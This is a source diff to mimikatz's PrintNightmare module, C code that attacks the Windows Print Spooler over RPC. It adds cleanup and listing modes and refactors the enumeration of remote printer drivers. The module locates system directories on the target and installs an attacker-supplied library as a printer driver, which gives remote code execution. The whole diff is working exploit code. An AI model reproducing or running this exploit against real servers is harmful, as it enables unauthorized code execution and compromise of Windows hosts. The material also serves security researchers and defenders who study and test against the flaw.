@@ -1419,19 +1419,21 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 
 	if(kull_m_string_args_byName(argc, argv, L"server", &szRemote, NULL) || kull_m_string_args_byName(argc, argv, L"target", &szRemote, NULL))
 	{
-		if(kull_m_string_args_byName(argc, argv, L"library", &szLibrary, NULL))
+		kprintf(L"| Remote    : %s\n", szRemote);
+		kull_m_rpc_getArgs(argc, argv, NULL, NULL, NULL, &szService, L"host", &AuthnSvc, ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE), NULL, &secIdentity, NULL, TRUE);
+
+		if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", szRemote, NULL, szService, TRUE, AuthnSvc, secIdentity.UserLength ? &secIdentity : NULL, RPC_C_IMP_LEVEL_DELEGATE, &hBinding, NULL))
 		{
-			szShortLibrary = wcsrchr(szLibrary, L'\\');
-			if(szShortLibrary && *(szShortLibrary + 1))
+			rpcStatus = RpcBindingSetObject(hBinding, (UUID *) &PAR_ObjectUUID);
+			if(rpcStatus == RPC_S_OK)
 			{
-				szShortLibrary++;
-				kprintf(L"| Remote    : %s\n", szRemote);
-				kull_m_rpc_getArgs(argc, argv, NULL, NULL, NULL, &szService, L"host", &AuthnSvc, ((MIMIKATZ_NT_MAJOR_VERSION < 6) ? RPC_C_AUTHN_GSS_KERBEROS : RPC_C_AUTHN_GSS_NEGOTIATE), NULL, &secIdentity, NULL, TRUE);
-				if(kull_m_rpc_createBinding(NULL, L"ncacn_ip_tcp", szRemote, NULL, szService, TRUE, AuthnSvc, secIdentity.UserLength ? &secIdentity : NULL, RPC_C_IMP_LEVEL_DELEGATE, &hBinding, NULL))
+				if(kull_m_string_args_byName(argc, argv, L"library", &szLibrary, NULL))
 				{
-					rpcStatus = RpcBindingSetObject(hBinding, (UUID *) &PAR_ObjectUUID);
-					if(rpcStatus == RPC_S_OK)
+					szShortLibrary = wcsrchr(szLibrary, L'\\');
+					if(szShortLibrary && *(szShortLibrary + 1))
 					{
+						szShortLibrary++;
+
 						if(kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath(hBinding, DriverInfo.pEnvironment, &szSystem32, &szDriver))
 						{
 							if(kull_m_string_sprintf(&szKernelBase, L"%skernelbase.dll", szSystem32))
@@ -1470,75 +1472,106 @@ NTSTATUS kuhl_m_misc_printnightmare(int argc, wchar_t * argv[])
 							LocalFree(szDriver);
 						}
 					}
-					else PRINT_ERROR(L"RpcBindingSetObject: 0x%08x (%u)\n", rpcStatus, rpcStatus);
-
-					kull_m_rpc_deleteBinding(&hBinding);
+					else PRINT_ERROR(L"Unable to get short library name from library path (%s)\n", szLibrary);
+				}
+				else if(kull_m_string_args_byName(argc, argv, L"clean", NULL, NULL))
+				{
+					kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete(hBinding, DriverInfo.pEnvironment, TRUE);
+				}
+				else
+				{
+					kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete(hBinding, DriverInfo.pEnvironment, FALSE);
 				}
 			}
-			else PRINT_ERROR(L"Unable to get short library name from library path (%s)\n", szLibrary);
+			else PRINT_ERROR(L"RpcBindingSetObject: 0x%08x (%u)\n", rpcStatus, rpcStatus);
+
+			kull_m_rpc_deleteBinding(&hBinding);
 		}
-		else PRINT_ERROR(L"missing /library argument to specify anonymous share");
 	}
 	else PRINT_ERROR(L"missing /server argument to specify spooler server");
 
 	return STATUS_SUCCESS;
 }
 
+void kuhl_m_misc_printnightmare_CallEnumPrintersAndMaybeDelete(handle_t hRemoteBinding, LPCWSTR szEnvironment, BOOL bIsDelete)
+{
+	DWORD ret, i, cReturned = 0;
+	_PDRIVER_INFO_2 pDriverInfo;
+	PWSTR pName, pConfig;
+
+	if(kuhl_m_misc_printnightmare_CallEnumPrinters(hRemoteBinding, szEnvironment, &pDriverInfo, &cReturned))
+	{
+		for(i = 0; i < cReturned; i++)
+		{
+			pName = (PWSTR) (pDriverInfo[i].NameOffset ? (PBYTE) &pDriverInfo[i] + pDriverInfo[i].NameOffset : NULL);
+			pConfig = (PWSTR) (pDriverInfo[i].ConfigFileOffset ? (PBYTE) &pDriverInfo[i] + pDriverInfo[i].ConfigFileOffset : NULL);
+
+			if(pName && pConfig)
+			{
+				kprintf(L"| %s (%s)\n", pName, pConfig);
+				if(bIsDelete)
+				{
+					if(pName == wcsstr(pName, MIMIKATZ L"-"))
+					{
+						kprintf(L"> ");
+						RpcTryExcept
+						{
+							ret = RpcAsyncDeletePrinterDriverEx(hRemoteBinding, NULL, (wchar_t *) szEnvironment, pName, DPD_DELETE_UNUSED_FILES, 0);
+							if(ret == ERROR_SUCCESS)
+							{
+								kprintf(L"deleted!\n");
+							}
+							else PRINT_ERROR(L"RpcAsyncDeletePrinterDriverEx(init): %u\n", ret);
+						}
+						RpcExcept(RPC_EXCEPTION)
+							PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
+						RpcEndExcept
+					}
+				}
+			}
+		}
+		LocalFree(pDriverInfo);
+	}
+}
+
 BOOL kuhl_m_misc_printnightmare_CallEnumPrintersAndFindSuitablePath(handle_t hRemoteBinding, LPCWSTR szEnvironment, LPWSTR *szSystem32, LPWSTR *szDriver)
 {
 	BOOL status = FALSE;
-	DWORD ret, i, cbNeeded = 0, cReturned = 0;
+	DWORD i, cReturned = 0;
 	_PDRIVER_INFO_2 pDriverInfo;
 	LPWSTR pDriverPath, ptrSys, ptrDrv;
 
 	if(szSystem32 && szDriver)
 	{
-		RpcTryExcept
+		if(kuhl_m_misc_printnightmare_CallEnumPrinters(hRemoteBinding, szEnvironment, &pDriverInfo, &cReturned))
 		{
-			ret = RpcAsyncEnumPrinterDrivers(hRemoteBinding, NULL, (wchar_t *) szEnvironment, 2, NULL, 0, &cbNeeded, &cReturned);
-			if(ret == ERROR_INSUFFICIENT_BUFFER)
+			for(i = 0; (i < cReturned) && !status; i++)
 			{
-				pDriverInfo = (_PDRIVER_INFO_2) LocalAlloc(LPTR, cbNeeded);
-				if(pDriverInfo)
+				pDriverPath = (PWSTR) (pDriverInfo[i].DriverPathOffset ? (PBYTE) &pDriverInfo[i] + pDriverInfo[i].DriverPathOffset : NULL);
+				if(pDriverPath)
 				{
-					ret = RpcAsyncEnumPrinterDrivers(hRemoteBinding, NULL, (wchar_t *) szEnvironment, 2, (BYTE *) pDriverInfo, cbNeeded, &cbNeeded, &cReturned);
-					if(ret == ERROR_SUCCESS)
+					ptrSys = StrStrI(pDriverPath, L"system32\\driverstore\\filerepository\\ntprint.inf_");
+					if(ptrSys)
 					{
-						for(i = 0; (i < cReturned) && !status; i++)
+						ptrDrv = wcsrchr(pDriverPath, L'\\');
+						if(ptrDrv && *(ptrDrv + 1))
 						{
-							pDriverPath = (PWSTR) (pDriverInfo[i].DriverPathOffset ? (PBYTE) &pDriverInfo[i] + pDriverInfo[i].DriverPathOffset : NULL);
-							if(pDriverPath)
+							*(ptrDrv + 1) = L'\0';
+							if(kull_m_string_copy(szDriver, pDriverPath))
 							{
-								ptrSys = StrStrI(pDriverPath, L"system32\\driverstore\\filerepository\\ntprint.inf_");
-								if(ptrSys)
+								*(ptrSys + 9) = L'\0';
+								status = kull_m_string_copy(szSystem32, pDriverPath);
+								if(!status)
 								{
-									ptrDrv = wcsrchr(pDriverPath, L'\\');
-									if(ptrDrv && *(ptrDrv + 1))
-									{
-										*(ptrDrv + 1) = L'\0';
-										if(kull_m_string_copy(szDriver, pDriverPath))
-										{
-											*(ptrSys + 9) = L'\0';
-											status = kull_m_string_copy(szSystem32, pDriverPath);
-											if(!status)
-											{
-												LocalFree(*szDriver);
-											}
-										}
-									}
+									LocalFree(*szDriver);
 								}
 							}
 						}
 					}
-					else PRINT_ERROR(L"RpcEnumPrinterDrivers(data): %u\n", ret);
-					LocalFree(pDriverInfo);
 				}
 			}
-			else PRINT_ERROR(L"RpcEnumPrinterDrivers(init): %u\n", ret);
+			LocalFree(pDriverInfo);
 		}
-		RpcExcept(RPC_EXCEPTION)
-			PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
-		RpcEndExcept
 	}
 	return status;
 }
@@ -1594,6 +1627,40 @@ DWORD kuhl_m_misc_printnightmare_CallAddPrinterDriverEx(handle_t hRemoteBinding,
 	}
 
 	return ret;
+}
+
+BOOL kuhl_m_misc_printnightmare_CallEnumPrinters(handle_t hRemoteBinding, LPCWSTR szEnvironment, _PDRIVER_INFO_2 *ppDriverInfo, DWORD *pcReturned)
+{
+	BOOL status = FALSE;
+	DWORD ret, cbNeeded = 0;
+
+	RpcTryExcept
+	{
+		ret = RpcAsyncEnumPrinterDrivers(hRemoteBinding, NULL, (wchar_t *) szEnvironment, 2, NULL, 0, &cbNeeded, pcReturned);
+		if(ret == ERROR_INSUFFICIENT_BUFFER)
+		{
+			*ppDriverInfo = (_PDRIVER_INFO_2) LocalAlloc(LPTR, cbNeeded);
+			if(*ppDriverInfo)
+			{
+				ret = RpcAsyncEnumPrinterDrivers(hRemoteBinding, NULL, (wchar_t *) szEnvironment, 2, (BYTE *) *ppDriverInfo, cbNeeded, &cbNeeded, pcReturned);
+				if(ret == ERROR_SUCCESS)
+				{
+					status = TRUE;
+				}
+				else
+				{
+					PRINT_ERROR(L"RpcAsyncEnumPrinterDrivers(data): %u\n", ret);
+					LocalFree(*ppDriverInfo);
+				}
+			}
+		}
+		else PRINT_ERROR(L"RpcAsyncEnumPrinterDrivers(init): %u\n", ret);
+	}
+	RpcExcept(RPC_EXCEPTION)
+		PRINT_ERROR(L"RPC Exception: 0x%08x (%u)\n", RpcExceptionCode(), RpcExceptionCode());
+	RpcEndExcept
+
+	return status;
 }
 
 typedef struct _SCCM_ENCRYPTED_HEADER {
